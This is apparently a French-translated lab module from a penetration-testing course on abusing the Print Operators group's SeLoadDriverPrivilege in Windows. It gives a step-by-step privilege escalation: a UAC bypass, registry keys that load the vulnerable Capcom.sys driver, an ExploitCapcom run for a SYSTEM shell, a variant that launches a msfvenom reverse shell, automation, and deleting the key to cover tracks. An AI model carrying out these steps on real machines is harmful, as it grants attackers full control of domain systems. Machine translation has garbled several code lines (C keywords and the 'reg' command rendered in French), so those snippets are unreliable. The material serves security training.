Opérateurs d'impression
===============

* * * * *

[Opérateurs d'impression](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) est un autre groupe hautement privilégié, qui accorde à ses membres le `SeLoadDriverPrivilege`, les droits de gestion, de création, de partage et de suppression des imprimantes connectées à un contrôleur de domaine, ainsi que la possibilité de se connecter localement à un contrôleur de domaine et de l'arrêter. Si nous lançons la commande `whoami /priv` et ne voyons pas le `SeLoadDriverPrivilege` dans un contexte non élevé, nous devrons contourner l'UAC.

#### Confirmation des privilèges

Confirmation des privilèges

```
C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
======================== ========================== ======= =======
SeIncreaseQuotaPrivilege Ajuster les quotas de mémoire pour un processus Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeShutdownPrivilege Arrêter le système Désactivé

```

#### Vérifier à nouveau les privilèges

Le référentiel [UACMe](https://github.com/hfiref0x/UACME) présente une liste complète des contournements UAC, qui peuvent être utilisés à partir de la ligne de commande. Alternativement, à partir d'une interface graphique, nous pouvons ouvrir un shell de commande administratif et saisir les informations d'identification du compte membre du groupe Opérateurs d'impression. Si nous examinons à nouveau les privilèges, `SeLoadDriverPrivilege` est visible mais désactivé.

Vérifier à nouveau les privilèges

```
C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= ============= ==========
SeMachineAccountPrivilege Ajouter des postes de travail au domaine Désactivé
SeLoadDriverPrivilege Charger et décharger les pilotes de périphérique Désactivé
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé

```

Il est bien connu que le pilote `Capcom.sys` contient une fonctionnalité permettant à tout utilisateur d'exécuter du shellcode avec les privilèges SYSTEM. Nous pouvons utiliser nos privilèges pour charger ce pilote vulnérable et élever les privilèges. Nous pouvons utiliser [cet](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) outil pour charger le pilote. Le PoC active le privilège et charge le pilote pour nous.

Téléchargez-le localement et modifiez-le, en collant sur les éléments ci-dessous.

Code : c

```
#include <windows.h>
#include <assert.h>
#include <hiverl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"

```

Ensuite, à partir d'une invite de commandes développeur Visual Studio 2019, compilez-la à l'aide de cl.exe.

#### Compiler avec cl.exe

Compiler avec cl.exe

```
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Compilateur d'optimisation Microsoft (R) C/C++ version 19.28.29913 pour x86
Copyright (C)Microsoft Corporation. Tous les droits sont réservés.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C)Microsoft Corporation. Tous les droits sont réservés.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj

```

#### Ajouter une référence au pilote

Ensuite, téléchargez le pilote `Capcom.sys` depuis [ici](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) et enregistrez-le dans `C:\temp` . Exécutez les commandes ci-dessous pour ajouter une référence à ce pilote sous notre arborescence HKEY_CURRENT_USER.

Ajouter une référence au pilote

```
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

L'opération s'est bien déroulée.

C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

L'opération s'est bien déroulée.

```

L'étrange syntaxe `\??\` utilisée pour référencer ImagePath de notre pilote malveillant est un [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce- 426a-9991-7509e7c3787c). L'API Win32 analysera et résoudra ce chemin pour localiser et charger correctement notre pilote malveillant.

#### Vérifier que le pilote n'est pas chargé

À l'aide de [DriverView.exe](http://www.nirsoft.net/utils/driverview.html) de Nirsoft, nous pouvons vérifier que le pilote Capcom.sys n'est pas chargé.

Vérifier que le pilote n'est pas chargé

```
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

```

#### Vérifier que le privilège est activé

Exécutez le binaire `EnableSeLoadDriverPrivilege.exe` .

Vérifier que le privilège est activé

```
C:\htb> EnableSeLoadDriverPrivilege.exe

qui suis je:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege désactivé
SeLoadDriverPrivilège activé
SeShutdownPrivilege désactivé
SeChangeNotifyPrivilege activé par défaut
SeIncreaseWorkingSetPrivilege désactivé
NTSTATUS : 00000000, erreur Win :0

```

#### Vérifiez que le pilote Capcom est répertorié

Ensuite, vérifiez que le pilote Capcom est maintenant répertorié.

Vérifiez que le pilote Capcom est répertorié

```
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Nom du pilote : Capcom.sys
Nom du fichier : C:\Tools\Capcom.sys

```

#### Utilisez l'outil ExploitCapcom pour augmenter les privilèges

Pour exploiter Capcom.sys, nous pouvons utiliser l'outil [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) après avoir compilé avec Visual Studio.

Utiliser l'outil ExploitCapcom pour augmenter les privilèges

```
PS C:\htb> .\ExploitCapcom.exe

[*] Exploit Capcom.sys
[*] Le descripteur Capcom.sys a été obtenu sous la forme 0000000000000070
[*] Shellcode a été placé à 0000024822A50008
[+] Le shellcode a été exécuté
[+] Le vol de jetons a réussi
[+] Le shell SYSTEM a été lancé

```

Cela lance un shell avec les privilèges SYSTEM.

![printopsexploit](https://academy.hackthebox.com/storage/modules/67/capcomexploit.png)

* * * * *

Exploitation alternative - Pas d'interface graphique
-------------------------------

Si nous n'avons pas d'accès graphique à la cible, nous devrons modifier le code `ExploitCapcom.cpp` avant de compiler. Ici, nous pouvons modifier la ligne 292 et remplacer `C:\\Windows\\system32\\cmd.exe"` par, disons, un binaire shell inversé créé avec `msfvenom`, par exemple : `c:\ProgramData\revshell.exe `.

Code : c

```
// Lance un processus shell de commande
booléen statique LaunchShell()
{
     TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
     PROCESS_INFORMATION ProcessInfo ;
     STARTUPINFO StartupInfo = { sizeof(StartupInfo) } ;
     if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
         CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
         &Information sur le processus))
     {
         retourner faux ;
     }

     CloseHandle(ProcessInfo.hThread);
     CloseHandle(ProcessInfo.hProcess);
     retourner vrai ;
}

```

La chaîne `CommandLine` dans cet exemple serait remplacée par :

Code : c

```
  TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");

```

Nous configurerions un écouteur basé sur la charge utile `msfvenom` que nous avons générée et, espérons-le, recevrons une connexion shell inversée lors de l'exécution de `ExploitCapcom.exe`. Si une connexion shell inversée est bloquée pour une raison quelconque, nous pouvons essayer un shell de liaison ou une charge utile exec/add user.

* * * * *

Automatisation des étapes
--------------------

#### Automatisation avec EopLoadDriver

Nous pouvons utiliser un outil tel que [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) pour automatiser le processus d'activation du privilège, de création de la clé de registre et d'exécution de `NTLoadDriver` pour charger le pilote. Pour ce faire, nous exécuterions ce qui suit :

Automatisation avec EopLoadDriver

```
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Activation de SeLoadDriverPrivilege
[+] SeLoadDriverPrivilège activé
[+] Chargement du pilote : \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS : c000010e, erreur Win : 0

```

Nous exécutons ensuite `ExploitCapcom.exe` pour afficher un shell SYSTEM ou exécuter notre binaire personnalisé.

* * * * *

Nettoyer
--------

#### Suppression de la clé de registre

Nous pouvons brouiller un peu nos pistes en supprimant la clé de registre ajoutée précédemment.

Suppression de la clé de registre

```
C:\htb> reg supprimer HKCU\System\CurrentControlSet\Capcom

Supprimer définitivement la clé de registre HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Oui/Non) ? Oui

L'opération s'est bien déroulée.

```

Remarque : Depuis Windows 10 Version 1803, le "SeLoadDriverPrivilege" n'est pas exploitable, car il n'est plus possible d'inclure des références aux clés de registre sous "HKEY_CURRENT_USER".